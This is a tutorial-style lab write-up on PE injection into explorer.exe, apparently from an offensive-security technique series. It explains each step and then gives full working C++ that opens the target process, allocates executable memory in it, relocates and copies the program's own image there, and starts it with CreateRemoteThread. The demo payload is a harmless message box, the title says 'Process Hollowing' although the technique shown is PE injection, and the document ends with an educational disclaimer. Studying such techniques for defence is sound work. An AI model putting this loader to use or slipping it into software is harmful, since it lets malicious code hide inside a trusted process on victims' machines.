<h1 align="center">Process Hollowing</h1>
<p align="center">
  <img src="../Assets/pei_AI.jpg" alt="UH" width="500px">
</p>

## Overview
In this lab, we cover PE (Portable Executable) Injection into another process, specifically targeting `explorer.exe`. PE injection involves injecting an entire PE (itself) into the memory of a target process and then executing it.

## Steps
1. `Open Target Process:` `GetProcessHandle()` is called to get a handle to the explorer.exe process.
2. `Get Current Image's Base Address:` `GetModuleHandle(NULL)` retrieves the base address of the current executable.
3. `Allocate Memory for the Local Image:` `VirtualAlloc` allocates memory in the current process for the size of the image.
4. `Allocate Memory in the Target Process:` `VirtualAllocEx` allocates memory in the target process (i.e., explorer.exe) for the image being injected. 
5. `Calculate Delta and Relocate the Image:` The difference between the target and local base addresses (deltaBase) is calculated. This will be used to fix any hardcoded addresses in the PE.
6. `Relocate the Image:` The PE is relocated to match the address space in the target process.
7. `Start the Injected PE:` After writing, `CreateRemoteThread` creates a thread in the target process and starts execution at the address of the self function, which has been adjusted using the deltaBase to reflect its new address in the target process.

## Walkthrough

This code Iterate Over the Processes and return the handle of explorer.exe.

```cpp
HANDLE GetProcessHandle(const wchar_t* processName) {
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  // Take a snapshot of all processes
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		std::wcerr << L"Failed to create process snapshot." << std::endl;
		return NULL;
	}

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32FirstW(hProcessSnap, &pe32)) {  // Retrieve the first process information
		std::wcerr << L"Failed to retrieve the first process information." << std::endl;
		CloseHandle(hProcessSnap);
		return NULL;
	}

	do {
		if (_wcsicmp(pe32.szExeFile, processName) == 0) {  // Compare process name with "explorer.exe"
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			if (hProcess == NULL) {
				std::wcerr << L"Failed to open process handle for " << processName << L". Error: " << GetLastError() << std::endl;
			}
			else {
				CloseHandle(hProcessSnap);  // Close snapshot handle after use
				return hProcess;  // Return the handle to the explorer.exe process
			}
		}
	} while (Process32NextW(hProcessSnap, &pe32));  // Continue to the next process

	CloseHandle(hProcessSnap);  // Close snapshot handle if process not found
	std::wcerr << L"Process " << processName << L" not found." << std::endl;
	return NULL;
}

```
`GetModuleHandle(NULL)` retrieves the base address of the current executable. `PIMAGE_DOS_HEADER and PIMAGE_NT_HEADERS` are pointers to the DOS and NT headers of the PE.
These headers contain important information like the size of the image and the location of data directories (like relocation table).
```cpp
   // Get current image's base address
	PVOID imageBase = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

```
`VirtualAlloc` allocates memory in the current process for the size of the image. `memcpy` copies the entire PE image to this newly allocated memory.
```cpp
// Allocate a new memory block and copy the current PE image to this new memory block
	PVOID lImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
	memcpy(lImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

```
Calculate Delta and Relocate the Image.
```cpp
// Calculate delta between addresses of where the image will be located in the target process and where it's located currently
	DWORD_PTR deltaBase = (DWORD_PTR)tImage - (DWORD_PTR)imageBase;

	// Relocate localImage, to ensure that it will have correct addresses once its in the target process
	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)lImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	DWORD relocationEntriesCount = 0;
	PDWORD_PTR patchedAddress;
	PBASE_RELOCATION_ENTRY relocationRVA = NULL;

	while (relocationTable->SizeOfBlock > 0)
	{
		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

		for (short i = 0; i < relocationEntriesCount; i++)
		{
			if (relocationRVA[i].Offset)
			{
				patchedAddress = (PDWORD_PTR)((DWORD_PTR)lImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
				*patchedAddress += deltaBase;
			}
		}
		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
	}

```
Writes the relocated image into the target process's allocated memory block and creates a thread in the target process and starts execution at the address of the self function, which has been adjusted using the deltaBase to reflect its new address in the target process.
```cpp
  	// Write the relocated localImage into the target process
	WriteProcessMemory(hExp, tImage, lImage, ntHeader->OptionalHeader.SizeOfImage, NULL);

	// Start the injected PE inside the target process
	CreateRemoteThread(hExp, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)self + deltaBase), NULL, 0, NULL);
```

## Full Code
```cpp
#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

DWORD self()
{	
	MessageBoxA(NULL, "PE Injection", "Hello from Offensive-Panda", NULL);
	return 0;
}

HANDLE GetProcessHandle(const wchar_t* processName) {
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  // Take a snapshot of all processes
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		std::wcerr << L"Failed to create process snapshot." << std::endl;
		return NULL;
	}

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32FirstW(hProcessSnap, &pe32)) {  // Retrieve the first process information
		std::wcerr << L"Failed to retrieve the first process information." << std::endl;
		CloseHandle(hProcessSnap);
		return NULL;
	}

	do {
		if (_wcsicmp(pe32.szExeFile, processName) == 0) {  // Compare process name with "explorer.exe"
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			if (hProcess == NULL) {
				std::wcerr << L"Failed to open process handle for " << processName << L". Error: " << GetLastError() << std::endl;
			}
			else {
				CloseHandle(hProcessSnap);  // Close snapshot handle after use
				return hProcess;  // Return the handle to the explorer.exe process
			}
		}
	} while (Process32NextW(hProcessSnap, &pe32));  // Continue to the next process

	CloseHandle(hProcessSnap);  // Close snapshot handle if process not found
	std::wcerr << L"Process " << processName << L" not found." << std::endl;
	return NULL;
}
int main()
{
	const wchar_t* processName = L"explorer.exe";
	HANDLE hExp = GetProcessHandle(processName);
	// Get current image's base address
	PVOID imageBase = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

	// Allocate a new memory block and copy the current PE image to this new memory block
	PVOID lImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
	memcpy(lImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

	// Allote a new memory block in the target process. This is where we will be injecting this PE
	PVOID tImage = VirtualAllocEx(hExp, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Calculate delta between addresses of where the image will be located in the target process and where it's located currently
	DWORD_PTR deltaBase = (DWORD_PTR)tImage - (DWORD_PTR)imageBase;

	// Relocate localImage, to ensure that it will have correct addresses once its in the target process
	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)lImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	DWORD relocationEntriesCount = 0;
	PDWORD_PTR patchedAddress;
	PBASE_RELOCATION_ENTRY relocationRVA = NULL;

	while (relocationTable->SizeOfBlock > 0)
	{
		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

		for (short i = 0; i < relocationEntriesCount; i++)
		{
			if (relocationRVA[i].Offset)
			{
				patchedAddress = (PDWORD_PTR)((DWORD_PTR)lImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
				*patchedAddress += deltaBase;
			}
		}
		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
	}

	// Write the relocated localImage into the target process
	WriteProcessMemory(hExp, tImage, lImage, ntHeader->OptionalHeader.SizeOfImage, NULL);

	// Start the injected PE inside the target process
	CreateRemoteThread(hExp, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)self + deltaBase), NULL, 0, NULL);

	return 0;
}

```
## Demonstration

![](Asset/PE9.gif)

For GitHub-Repo Click Here: [Offensive-Panda/ProcessInjectionTechniques](https://github.com/Offensive-Panda/ProcessInjectionTechniques/tree/main/PE_Code_Injection/PE_INJECTION)

### Disclaimer
The content provided on this series is for educational and informational purposes only. It is intended to help users understand cybersecurity concepts and techniques for improving security defenses!
